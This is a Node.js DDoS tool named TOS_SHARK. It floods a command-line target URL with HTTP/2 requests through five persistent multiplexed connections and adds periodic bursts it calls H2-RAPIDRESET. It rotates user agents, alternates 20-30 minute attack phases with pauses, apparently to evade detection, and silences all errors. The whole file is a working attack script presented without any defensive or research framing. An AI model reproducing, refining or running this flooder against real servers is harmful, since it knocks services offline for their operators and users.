const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = 'H2-MULTIPLEX';
        
        this.connections = [];
        this.h2ResetActive = false;
        this.lastResetAttack = 0;
        this.resetInterval = 0;
        
        this.userAgents = this.generateUserAgents();
        this.endpoints = this.generateEndpoints();
        
        this.startAttack();
    }

    generateUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ];
    }

    generateEndpoints() {
        return ['/', '/api', '/static', '/users', '/data'];
    }

    async startAttack() {
        this.attackActive = true;
        this.attackStart = Date.now();
        
        // Start H2-RAPIDRESET background attack
        this.startH2ResetAttack();
        
        // Create 5 persistent H2 connections
        for (let i = 0; i < 5; i++) {
            this.createConnection();
        }
        
        // Main H2-MULTIPLEX attack loop
        this.attackLoop();
    }

    createConnection() {
        try {
            const client = http2.connect(this.target);
            this.connections.push(client);
            
            client.on('error', () => {
                // Recreate connection if it dies
                setTimeout(() => this.createConnection(), 1000);
                this.connections = this.connections.filter(c => c !== client);
            });
            
        } catch (err) {}
    }

    async attackLoop() {
        while (this.running) {
            const now = Date.now();
            
            if (this.attackActive) {
                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startBreak();
                    continue;
                }
                
                // Use all 5 connections simultaneously
                for (const client of this.connections) {
                    if (client && !client.destroyed) {
                        this.attackH2Multiplex(client);
                    }
                }
                
                // Background H2-RAPIDRESET check
                if (!this.h2ResetActive && now - this.lastResetAttack >= this.resetInterval) {
                    this.startH2ResetAttack();
                }
                
            } else {
                if (now - this.breakStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.attackActive = true;
                    this.attackStart = Date.now();
                    continue;
                }
                
                await this.performMaintenance();
                await this.sleepRandom(1000, 3000);
            }
            
            await this.sleepRandom(0.1, 1);
        }
    }

    startBreak() {
        this.attackActive = false;
        this.breakStart = Date.now();
        
        // Clean up connections
        for (const client of this.connections) {
            try {
                client.destroy();
            } catch (e) {}
        }
        this.connections = [];
        
        if (global.gc) global.gc();
    }

    attackH2Multiplex(client) {
        if (!client || client.destroyed) return;
        
        const methods = ['HEAD', 'GET', 'OPTIONS'];
        
        // Send 125 requests per stream
        for (let i = 0; i < 125; i++) {
            const method = methods[Math.floor(Math.random() * methods.length)];
            
            try {
                const req = client.request({
                    ':method': method,
                    ':path': '/',
                    ':authority': this.host,
                    'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
                });
                
                req.on('response', (headers) => {
                    this.logStatus(headers[':status']);
                    req.destroy();
                });
                
                req.on('error', () => {
                    this.logStatus('*.*');
                    req.destroy();
                });
                
                req.end();
                
                this.totalReqs++;
                this.reqCounter++;
                
            } catch (err) {
                this.logStatus('*.*');
                this.totalReqs++;
                this.reqCounter++;
            }
        }
    }

    startH2ResetAttack() {
        if (this.h2ResetActive) return;
        
        this.h2ResetActive = true;
        this.lastResetAttack = Date.now();
        this.resetInterval = (120 + Math.random() * 180) * 1000; // 120-300s
        
        // Execute H2-RAPIDRESET attack in background
        setTimeout(() => {
            this.executeH2ResetAttack();
        }, 0);
    }

    executeH2ResetAttack() {
        try {
            const client = http2.connect(this.target);
            
            // Create 2 streams with 100 requests each
            const streamPromises = [];
            
            for (let s = 0; s < 2; s++) {
                const streamPromise = new Promise((resolve) => {
                    setTimeout(() => {
                        const methods = ['HEAD', 'GET', 'OPTIONS'];
                        
                        for (let i = 0; i < 100; i++) {
                            const method = methods[Math.floor(Math.random() * methods.length)];
                            
                            try {
                                const req = client.request({
                                    ':method': method,
                                    ':path': '/',
                                    ':authority': this.host
                                });
                                
                                req.on('response', (headers) => {
                                    this.logStatus(headers[':status']);
                                    req.destroy();
                                });
                                
                                req.on('error', () => {
                                    this.logStatus('*.*');
                                    req.destroy();
                                });
                                
                                req.end();
                                
                                this.totalReqs++;
                                this.reqCounter++;
                                
                            } catch (err) {
                                this.logStatus('*.*');
                                this.totalReqs++;
                                this.reqCounter++;
                            }
                            
                            // 0.8ms delay between requests
                            if (i < 99) {
                                const now = Date.now();
                                while (Date.now() - now < 0.8) {}
                            }
                        }
                        resolve();
                    }, s * 10);
                });
                
                streamPromises.push(streamPromise);
            }
            
            Promise.all(streamPromises).then(() => {
                setTimeout(() => {
                    try {
                        client.destroy();
                    } catch (e) {}
                    this.h2ResetActive = false;
                }, 100);
            });
            
        } catch (err) {
            this.h2ResetActive = false;
        }
    }

    async performMaintenance() {
        this.userAgents = this.generateUserAgents();
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 10000) {
            this.lastLog = now;
            console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
        }
    }

    sleepRandom(min, max) {
        const duration = Math.random() * (max - min) + min;
        return new Promise(resolve => setTimeout(resolve, duration));
    }
}

if (require.main === module) {
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
